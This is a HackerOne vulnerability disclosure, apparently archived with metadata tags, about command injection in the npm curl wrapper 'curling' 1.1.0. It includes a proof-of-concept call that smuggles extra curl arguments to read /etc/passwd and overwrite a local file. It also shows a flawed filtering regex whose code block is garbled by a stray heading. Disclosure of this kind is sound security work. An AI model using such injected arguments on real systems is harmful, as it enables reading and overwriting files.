---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2021-01-14
submitted: 2020-09-02T18:05:45.807Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "solov9ev"
source: "https://hackerone.com/reports/973386"
title: "[curling] Remote Code Execution"
---
# [curling] Remote Code Execution

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2021-01-14

- Report: [https://hackerone.com/reports/973386](https://hackerone.com/reports/973386)
- CWE: Command Injection - Generic
- Submitted: 2020-09-02T18:05:45.807Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `RCE` in `curling`
I can bypass the security check for special characters, read / overwrite file

# Module

**module name:** curling
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/curling`

## Module Description

A node wrapper for curl with a very simple api.

## Module Stats

[156] weekly downloads

# Vulnerability

## Vulnerability Description

The regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:
```javascript
/[`
## Timeline{}[;|]/g.test(command)
```

## Steps To Reproduce:

- Run `npm i curling`

- Create and run the following POC index.js:

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

- The exploit worked and overwritten the file - `index.js`

{F973903}

## Patch

Regular expression needs improvement

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `curling` module via insecure command

## Timeline

- **Report Filed**
- **2020-12-10** @solov9ev: Hello! Any updates?
- **Report Resolved**
- **Agreed On Going Public**
- **2021-01-07** @solov9ev: Hi, @danielruf

Did you report a vulnerability in their library to the developer?
- **2021-01-07** @bbe8482aecd24374d13c5de15a0a6: @solov9ev yes I did and I invited them to this report. So far no reaction. This is why I requested disclosure.
- **Report Became Public**
